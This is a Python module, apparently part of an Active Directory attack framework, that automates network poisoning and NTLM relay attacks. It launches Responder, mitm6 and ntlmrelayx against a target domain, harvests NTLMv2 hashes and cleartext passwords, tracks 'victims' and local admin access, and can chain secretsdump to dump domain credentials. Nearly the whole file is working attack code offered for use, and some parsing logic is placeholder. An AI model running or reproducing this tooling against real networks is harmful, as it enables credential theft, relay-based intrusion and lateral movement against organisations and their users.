"""
Implementation of network protocol poisoning and Man-in-the-Middle attacks using established tools.
Integrates with:
- Responder for LLMNR/NBT-NS/mDNS poisoning
- mitm6 for IPv6 poisoning
- ntlmrelayx.py for relay attacks
"""

import subprocess
import threading
import time
import os
import json
from typing import Dict, Optional, List
from pathlib import Path
import configparser
import signal
from .attack_base import AttackBase

class PoisoningAttacks(AttackBase):
    def __init__(self):
        super().__init__()
        self.stop_poisoning = False
        self.processes = {
            'responder': None,
            'mitm6': None,
            'ntlmrelay': None
        }
        self.stats = {
            'attempts': 0,
            'captured': 0,
            'relayed': 0,
            'admin_access': 0,
            'cleartext': 0
        }
        self._setup_tools()

    def _setup_tools(self):
        """Verify tools are installed and configure them"""
        # Create directory for tool outputs
        self.output_dir = Path('/tmp/adaf_poisoning')
        self.output_dir.mkdir(exist_ok=True)

        # Paths for tool outputs
        self.responder_log = self.output_dir / 'Responder-Session.log'
        self.ntlmrelay_log = self.output_dir / 'ntlmrelay.log'
        self.targets_file = self.output_dir / 'targets.txt'
        self.loot_dir = self.output_dir / 'loot'
        self.loot_dir.mkdir(exist_ok=True)

    def configure_responder(self, disable_servers: List[str] = None):
        """
        Configure Responder settings
        
        Args:
            disable_servers: List of servers to disable (e.g., ['HTTP', 'SMB'])
        """
        try:
            # Find Responder.conf
            responder_conf = '/etc/responder/Responder.conf'
            if not os.path.exists(responder_conf):
                self.log_error("Responder.conf not found. Please ensure Responder is installed.")
                return False

            config = configparser.ConfigParser()
            config.read(responder_conf)

            # Disable specified servers
            if disable_servers:
                for server in disable_servers:
                    if server in config['Responder Core']:
                        config['Responder Core'][server] = 'Off'
                        self.log_status(f"Disabled {server} server in Responder")

            # Write updated config
            with open(responder_conf, 'w') as f:
                config.write(f)

            return True

        except Exception as e:
            self.log_error(f"Failed to configure Responder: {str(e)}")
            return False

    def start_poisoning_attack(self, interface: str, target_domain: str, 
                             attack_type: str = 'all', relay: bool = False,
                             post_exploit: bool = False) -> bool:
        """
        Start comprehensive poisoning attack using Responder, mitm6, and ntlmrelayx
        
        Args:
            interface: Network interface to use
            target_domain: Domain to target (must be FQDN for mitm6)
            attack_type: Type of attack ('all', 'responder', 'mitm6')
            relay: Whether to enable ntlmrelayx
            post_exploit: Whether to attempt post-exploitation
        """
        try:
            self.stop_poisoning = False
            
            # Validate domain format
            if not target_domain or '.' not in target_domain:
                self.log_error("Invalid domain format. Must be FQDN (e.g., corp.local)")
                return False

            self.target_domain = target_domain
            
            # Configure Responder
            if attack_type in ['all', 'responder']:
                if relay:
                    # Disable HTTP and SMB for relay
                    self.configure_responder(disable_servers=['HTTP', 'SMB'])
                else:
                    # Enable all servers if just capturing
                    self.configure_responder(disable_servers=[])

            # Start monitoring thread
            self.monitor_thread = threading.Thread(target=self._monitor_stats)
            self.monitor_thread.daemon = True
            self.monitor_thread.start()

            # Start ntlmrelayx if relay enabled
            if relay:
                self._start_ntlmrelay(post_exploit)

            # Start Responder
            if attack_type in ['all', 'responder']:
                self._start_responder(interface)

            # Start mitm6
            if attack_type in ['all', 'mitm6']:
                self._start_mitm6(interface, target_domain)

            return True

        except Exception as e:
            self.log_error(f"Failed to start poisoning attack: {str(e)}")
            self.stop_poisoning_attack()
            return False

    def _start_responder(self, interface: str):
        """Start Responder with appropriate options"""
        try:
            # Get domain from target_domain if set
            domain_filter = []
            if hasattr(self, 'target_domain'):
                # Add domain suffixes to filter
                domain_filter.extend([
                    self.target_domain.lower(),
                    self.target_domain.split('.')[0].lower()  # NetBIOS name
                ])
                self.log_status(f"Filtering Responder responses to domain: {self.target_domain}")

            cmd = [
                'responder',
                '-I', interface,
                '-w',  # Enable WPAD
                '-f',  # Enable fingerprinting
                '-A'   # Analyze mode
            ]

            # Add domain targeting if filters specified
            if domain_filter:
                cmd.extend(['-d', ','.join(domain_filter)])

            self.processes['responder'] = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )

            # Start output monitoring thread
            threading.Thread(target=self._monitor_responder_output, daemon=True).start()
            self.log_success("Started Responder")

        except Exception as e:
            self.log_error(f"Failed to start Responder: {str(e)}")

    def _start_mitm6(self, interface: str, domain: str):
        """Start mitm6 with appropriate options"""
        try:
            # Validate domain format
            if not domain or '.' not in domain:
                self.log_error("Invalid domain format. Must be FQDN (e.g., corp.local)")
                return

            cmd = [
                'mitm6',
                '-i', interface,
                '-d', domain,
                '--ignore-nofqdn'  # More permissive
            ]

            # Add domain targeting
            self.log_status(f"Targeting IPv6 poisoning to domain: {domain}")

            self.processes['mitm6'] = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )

            # Start output monitoring thread
            threading.Thread(target=self._monitor_mitm6_output, daemon=True).start()
            self.log_success("Started mitm6")

        except Exception as e:
            self.log_error(f"Failed to start mitm6: {str(e)}")

    def _start_ntlmrelay(self, post_exploit: bool = False):
        """Start ntlmrelayx with appropriate options"""
        try:
            cmd = [
                'ntlmrelayx.py',
                '-tf', str(self.targets_file),
                '-smb2support',
                '-socks',  # Enable SOCKS proxy
                '-wh', f'notreal.{self.target_domain}',  # WPAD host
                '-6',  # IPv6 support
                '-l', str(self.loot_dir)  # Output directory
            ]

            if post_exploit:
                cmd.extend(['-c', 'secretsdump.py -use-vss -just-dc-user "DOMAIN/USER" "DOMAIN/USER"@"TARGET"'])

            self.processes['ntlmrelay'] = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )

            # Start output monitoring thread
            threading.Thread(target=self._monitor_ntlmrelay_output, daemon=True).start()
            self.log_success("Started ntlmrelayx")

        except Exception as e:
            self.log_error(f"Failed to start ntlmrelayx: {str(e)}")

    def _monitor_responder_output(self):
        """Monitor Responder output for captured hashes and statistics"""
        while not self.stop_poisoning and self.processes['responder']:
            output = self.processes['responder'].stdout.readline()
            if output:
                if "[+] Listening for events" in output:
                    self.log_status("Responder is ready and listening")
                elif "NTLMv2-SSP Hash" in output:
                    self.stats['captured'] += 1
                    self._parse_and_store_hash(output)
                elif "cleartext credentials" in output.lower():
                    self.stats['cleartext'] += 1
                    self._parse_and_store_cleartext(output)

    def _monitor_mitm6_output(self):
        """Monitor mitm6 output for IPv6 activity"""
        while not self.stop_poisoning and self.processes['mitm6']:
            output = self.processes['mitm6'].stdout.readline()
            if output:
                if "Sent spoofed reply" in output:
                    self.stats['attempts'] += 1
                elif "New victim" in output:
                    self.log_success(f"New IPv6 victim: {output.strip()}")

    def _monitor_ntlmrelay_output(self):
        """Monitor ntlmrelayx output for successful relays and admin access"""
        while not self.stop_poisoning and self.processes['ntlmrelay']:
            output = self.processes['ntlmrelay'].stdout.readline()
            if output:
                if "Authenticating against smb://" in output:
                    self.stats['relayed'] += 1
                elif "Target system is local admin" in output:
                    self.stats['admin_access'] += 1
                    self.log_success(f"Local admin access achieved: {output.strip()}")
                elif "secretsdump.py result" in output:
                    self.log_success(f"Secretsdump successful: {output.strip()}")

    def _monitor_stats(self):
        """Monitor and display attack statistics"""
        while not self.stop_poisoning:
            self.notify("stats", {
                "attempts": self.stats['attempts'],
                "captured": self.stats['captured'],
                "relayed": self.stats['relayed'],
                "admin_access": self.stats['admin_access'],
                "cleartext": self.stats['cleartext']
            })
            time.sleep(5)

    def stop_poisoning_attack(self):
        """Stop all running poisoning attacks and cleanup"""
        self.stop_poisoning = True

        # Stop all processes
        for name, process in self.processes.items():
            if process:
                try:
                    process.terminate()
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()
                self.processes[name] = None

        # Display final statistics
        self.log_status("\nFinal Statistics:")
        self.log_status(f"Total Attempts: {self.stats['attempts']}")
        self.log_status(f"Hashes Captured: {self.stats['captured']}")
        self.log_status(f"Successfully Relayed: {self.stats['relayed']}")
        self.log_status(f"Local Admin Access: {self.stats['admin_access']}")
        self.log_status(f"Cleartext Credentials: {self.stats['cleartext']}")

        # Restore Responder configuration
        self.configure_responder(disable_servers=[])

    def _parse_and_store_hash(self, output: str):
        """Parse and store captured hash from Responder output"""
        try:
            # Example parsing logic - adjust based on actual output format
            if "NTLMv2-SSP Hash" in output:
                parts = output.split(':')
                if len(parts) >= 4:
                    self.log_credential(
                        username=parts[0],
                        domain=parts[2],
                        hash=':'.join(parts[3:]),
                        additional_info={'source': 'Responder', 'type': 'NTLMv2'}
                    )
        except Exception as e:
            self.log_error(f"Failed to parse hash: {str(e)}")

    def _parse_and_store_cleartext(self, output: str):
        """Parse and store captured cleartext credentials"""
        try:
            # Example parsing logic - adjust based on actual output format
            if "cleartext credentials" in output.lower():
                if '\\' in output and ':' in output:
                    domain_user = output.split('\\')[0]
                    domain, username = domain_user.split('/')
                    password = output.split(':')[1].strip()
                    self.log_credential(
                        username=username,
                        domain=domain,
                        password=password,
                        additional_info={'source': 'Responder', 'type': 'Cleartext'}
                    )
        except Exception as e:
            self.log_error(f"Failed to parse cleartext credentials: {str(e)}") 